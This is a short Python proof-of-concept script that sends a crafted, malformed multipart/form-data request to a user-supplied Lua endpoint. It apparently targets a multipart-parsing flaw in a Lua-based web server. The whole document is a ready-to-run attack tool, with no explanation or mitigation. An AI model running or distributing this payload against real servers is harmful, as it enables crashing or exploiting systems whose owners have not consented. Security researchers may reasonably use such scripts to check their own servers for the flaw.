import requests
import sys

def build_payload(boundary):
    return (
        f"{boundary}\r\n"
        "Content-Disposition: form-data; name=\"name\"\r\n\r\n"
        "0\r\n"
        f"{boundary}\r\n"
    )

if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} http://<host>/<luafile>")
    sys.exit(1)

url = sys.argv[1]
boundary = "4"

headers = {
    "Content-Type": f"multipart/form-data; boundary={boundary}"
}

payload = build_payload(boundary)

print("[*] Target:", url)
print("[*] Boundary:", boundary)
print("[*] Sending crafted multipart request...")

try:
    response = requests.post(url, headers=headers, data=payload, timeout=5)
    print("[*] HTTP Status:", response.status_code)
    print("[*] Server Response:\n", response.text)
except requests.exceptions.RequestException as e:
    print("[-] Request failed:", e)